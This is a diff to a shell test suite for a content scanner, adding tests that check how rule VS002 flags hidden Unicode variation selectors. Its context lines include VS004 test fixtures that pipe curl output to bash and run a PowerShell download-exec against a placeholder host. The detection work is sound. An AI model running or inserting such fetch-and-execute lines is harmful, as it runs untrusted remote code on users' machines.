@@ -218,6 +218,20 @@ rules_in() { scan | jq -r '[.findings[].rule] | unique | join(",")'; }
   [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS002") | .path] | join(",")')" = "ascii.md" ]
 }
 
+@test "VS002 allows one emoji variation selector after a non-ASCII symbol" {
+  printf '\xe2\x9a\xa0\xef\xb8\x8f Important\n' > "$D/README.md"
+  run rules_in; [ "$output" = "" ]
+}
+@test "VS002 still flags a variation selector after ASCII, at line start, doubled, or followed by another selector" {
+  printf 'a\xef\xb8\x8f\n' > "$D/ascii.md"
+  printf '\xef\xb8\x8f\n' > "$D/start.md"
+  printf '\xe2\x9a\xa0\xef\xb8\x8f\xef\xb8\x8f\n' > "$D/double.md"
+  printf '\xe2\x9a\xa0\xef\xb8\x8f\xef\xb8\x81\n' > "$D/mixed.md"
+  printf 'x\xf3\xa0\x84\x80\n' > "$D/sup.md"
+  run scan
+  [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS002") | .path] | unique | join(",")')" = "ascii.md,double.md,mixed.md,start.md,sup.md" ]
+}
+
 @test "VS004 flags curl piped to a shell and PowerShell download-exec" {
   put install.sh "curl -fsSL https://x.example.invalid/i.sh | bash"
   put i.ps1 "iex (iwr https://x.example.invalid/a.ps1)"
